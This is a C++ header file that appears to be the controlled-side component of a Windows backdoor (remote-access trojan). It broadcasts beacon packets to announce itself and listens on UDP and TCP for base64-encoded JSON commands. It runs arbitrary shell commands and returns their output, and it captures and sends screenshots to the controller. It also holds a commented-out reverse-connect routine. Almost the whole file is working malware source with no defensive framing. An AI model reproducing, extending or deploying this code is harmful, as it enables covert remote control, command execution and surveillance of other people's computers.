#pragma once
#include <protocol/BDoorProtocol.h>
#include<vector>
#include <other\tools.h>
#include <module\module.h>
class Command {
private:
	const string name = "command";
public:
	virtual int Func() = 0;
	virtual string GetName() = 0;
};
class RemoteCommand {
private:
	const string name;
public:
	virtual int Func(string command) = 0;
	virtual string GetName() = 0;
};
class CallHost : public Command{
private:
	const string name = "callhost";
	int call_frequency = 250;
public:
	int Func() override {
		cout << "CallHost线程启动" << endl;
		SOCKET call_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		sockaddr_in call_addr;
		call_addr.sin_family = AF_INET;
		call_addr.sin_port = htons(GROUP_PORT);
		call_addr.sin_addr.s_addr = inet_addr(GROUP_IP);
		bindport(call_socket, (const sockaddr*)&call_addr, sizeof(call_addr));
		bool bopt = true;
		setsockopt(call_socket, SOL_SOCKET, SO_BROADCAST, (char*)&bopt, sizeof(bopt));
		string sendmess = string(EMPTYCHAR);
		while (true) {	
			sendto(call_socket, sendmess.data(), sizeof(sendmess.data()), 0, (const sockaddr*)&call_addr, sizeof(call_addr));
			Sleep(call_frequency);
		}
	}
	string GetName()override { return name; }
};
class UDP :public Command {
private:
	class Cmd :public RemoteCommand {
	private:
		const string name = "cmd";
		SOCKET &udp_socket;
		sockaddr_in &udp_addr;
	public:
		Cmd(SOCKET& udp_socket_a, sockaddr_in& udp_addr_a) :udp_socket(udp_socket_a), udp_addr(udp_addr_a) {

		}
		int Func(string command) override {
			json command_json = json::parse(command);
			if (command_json[COMMANDNAME] == name) {
				DebugLog("cmd调用");
				string returnmess;
				if(run_cmd_with_txt(command_json[CONTENT], returnmess) == -1){
					returnmess = CMDERROR;
				}
				int Result = udp::SendtoBase64(udp_socket, udp_addr, FormatJson(name,EncodeBase64(returnmess,false)).dump());
				if (Result == -1) { DebugLog(SENDERROR); }
				else if (Result == 0) { DebugLog(DISCONNECT); }
				DebugLog(returnmess);
				return 1;
			}
			return 0;
		}
		string GetName()override { return name; }
	};
	const string name = "udp";
	SOCKET udp_socket;
	sockaddr_in udp_addr, sender_addr;
	Cmd cmd = Cmd(udp_socket,sender_addr);
	vector<RemoteCommand*> remote_command_list = { &cmd };
public:
	int Func()override {
		DebugLog("UDP线程启动");
		udp_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		udp_addr.sin_family = AF_INET;
		udp_addr.sin_port = htons(UDP_PORT);
		udp_addr.sin_addr.s_addr = htonl(INADDR_ANY);
		bindport(udp_socket, (const sockaddr*)&udp_addr, sizeof(udp_addr));
		while (true) {
			int Result;
			string recvmess;
			DebugLog("等待接收");
			Result = udp::RecvfromBase64(udp_socket, sender_addr, recvmess);
			if (Result == -1) { 
				DebugLog(RECVERROR);
				continue;
			}
			else if (Result == 0) {
				DebugLog(DISCONNECT); 
				continue;
			}
			DebugLog(string(inet_ntoa(sender_addr.sin_addr)) + "/UDP>" + recvmess);
			for (int i = 0; i < remote_command_list.size(); i++) {
				remote_command_list[i]->Func(recvmess);
			}
		}
	}
	string GetName()override { return name; }
};
class TCP :public Command {
private:
	class Cmd :public RemoteCommand {
	private:
		const string name = "cmd";
		SOCKET &connect_socket;
	public:
		Cmd(SOCKET& connect_socket_a) :connect_socket(connect_socket_a) {

		}
		int Func(string command)override {
			json command_json = json::parse(command);	
			if (command_json[COMMANDNAME] == name) {
				string returnmess;
				if (run_cmd_with_txt(command_json[CONTENT], returnmess) == -1) {
					returnmess = CMDERROR;
				}
				int Result = tcp::SendBase64(connect_socket, FormatJson(name, EncodeBase64(returnmess,false)).dump());
				if (Result == -1) {
					DebugLog(SENDERROR);
					return -1;
				}
				else if (Result == 0) {
					DebugLog(DISCONNECT);
					return -1;
				}
				DebugLog(returnmess);
				return 1;
			}
			return 0;
		}
		string GetName()override { return name; }
	};
	class ScreenShot :public RemoteCommand {
	private:
		const string name = "screenshot";
		const string imagep = "image.";
		SOCKET &connect_socket;
	public:
		ScreenShot(SOCKET &connect_socket_a):connect_socket(connect_socket_a){}
		int Func(string command)override {
			json com_json = json::parse(command);
			if (com_json[COMMANDNAME] == name) {
				string filename = imagep + string(com_json[CONTENT][IMAGEFORMAT]);
				GetScreenShot(filename);
				ifstream ifs;
				ifs.open(filename, ios::in|ios::binary);
				vector<char> data(istreambuf_iterator<char>(ifs), {});
				ifs.close();
				if (remove(filename.c_str()) == 0) {DebugLog("成功删除图片");}
				else {DebugLog("无法删除图片");}
				string img_data;
				for (int i = 0; i < data.size(); i++) { img_data += data[i]; }
				DebugLog("img_data size："+ to_string(img_data.size()));
				int Result = tcp::SendBase64(connect_socket, img_data);
				if (Result == -1) {
					DebugLog(SENDERROR);
					return -1;
				}
				else if(Result == 0){
					DebugLog(DISCONNECT);
				}
				return 1;
			}
			return 0;
		}
		string GetName()override {return name;}
	};
	const string name = "tcp";
	SOCKET connect_socket;
	Cmd cmd = Cmd(connect_socket);
	ScreenShot screenshot = ScreenShot(connect_socket);
	vector<RemoteCommand*> remote_command_list = { &cmd,&screenshot};
public:
	int Func() override{
		DebugLog("TCP线程启动");
		SOCKET listen_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		sockaddr_in listen_addr;
		listen_addr.sin_family = AF_INET;
		listen_addr.sin_port = htons(TCP_PORT);
		listen_addr.sin_addr.s_addr = htonl(INADDR_ANY);
		bindport(listen_socket, (const sockaddr*)&listen_addr, sizeof(listen_addr));
		//thread(&TCP::ReverseConnect,this).detach();
		listen(listen_socket,5);
		while (true) {
			sockaddr_in connect_addr;
			int connect_addr_len = sizeof(connect_addr);
			connect_socket = accept(listen_socket, (sockaddr*)&connect_addr, &connect_addr_len);
			int Timeout = TIMEOUT;
			//设置发送超时为1000ms
			if (SOCKET_ERROR == setsockopt(this->connect_socket, SOL_SOCKET, SO_SNDTIMEO, (char*)&Timeout, sizeof(int)))
			{
				fprintf(stderr, "Set SO_SNDTIMEO error !\n");
			}

			//设置接收超时为1000ms
			if (SOCKET_ERROR == setsockopt(this->connect_socket, SOL_SOCKET, SO_RCVTIMEO, (char*)&Timeout, sizeof(int)))
			{
				fprintf(stderr, "Set SO_RCVTIMEO error !\n");
			}
			DebugLog(inet_ntoa(connect_addr.sin_addr));
			string recvmess;
			int Result = tcp::RecvBase64(connect_socket, recvmess);
			if (Result == -1) {
				DebugLog(RECVERROR);
				continue;
			}
			else if (Result == 0) {
				DebugLog(DISCONNECT);
				continue;
			}
			DebugLog(string(inet_ntoa(connect_addr.sin_addr)) + "/TCP>" + recvmess);
			for (int i = 0; i < remote_command_list.size(); i++) {
				remote_command_list[i]->Func(recvmess);
			}
		}
	}
	/*int ReverseConnect() {
		int Result;
		DebugLog("反向TCP线程启动");
		SOCKET reverse_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		sockaddr_in reverse_addr;
		reverse_addr.sin_family = AF_INET;
		reverse_addr.sin_port = htons(REVERSE_PORT);
		reverse_addr.sin_addr.s_addr = htonl(INADDR_ANY);
		bindport(reverse_socket, (const sockaddr *)&reverse_addr, sizeof(reverse_addr));
		while (true) {
			string recvmess;
			sockaddr_in sender_addr;
			Result = udp::RecvfromBase64(reverse_socket, sender_addr, recvmess);
			if (Result == -1) {
				DebugLog(RECVERROR);
				continue;
			}
			else if (Result == 0) {
				DebugLog(DISCONNECT); 
				continue;
			}
			json requestmess;
			requestmess.parse(recvmess);
			if (requestmess[COMMANDNAME] == name) {
				if (requestmess[CONTENT] == REVERSECONNECT) {
					DebugLog(string(inet_ntoa(sender_addr.sin_addr)) + ": 反向连接请求");
					connect_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
					sockaddr_in addr;
					addr.sin_family = AF_INET;
					addr.sin_port = htons(TCP_PORT);
					addr.sin_addr.s_addr = inet_addr(inet_ntoa(sender_addr.sin_addr));
					connect(connect_socket, (const sockaddr*)&addr, sizeof(addr));
					int Result = tcp::RecvBase64(connect_socket, recvmess);
					if (Result == -1) {
						DebugLog(RECVERROR);
						return ERROR;
					}
					else if (Result == 0) {
						DebugLog(DISCONNECT);
						return ERROR;
					}
					DebugLog(string(inet_ntoa(addr.sin_addr)) + "/TCP>" + recvmess);
					for (int i = 0; i < remote_command_list.size(); i++) {
						remote_command_list[i]->Func(recvmess);
					}
				}
			}
		}	
	}*/
	string GetName()override { return name; }
};
class BDoorControlled {
private:
	int wsa = WSAInit();
	CallHost call_host = CallHost();
	UDP udp = UDP();
	TCP tcp = TCP();
	vector <Command*> command_list = { &call_host,&udp ,&tcp};
public:
	BDoorControlled(){
		for (int i = 0; i < command_list.size(); i++) {
			thread t([=]() {
				command_list[std::ref(i)]->Func();
				});
			if (i == command_list.size() - 1) {t.join();}else { t.detach(); }
		}
	}
};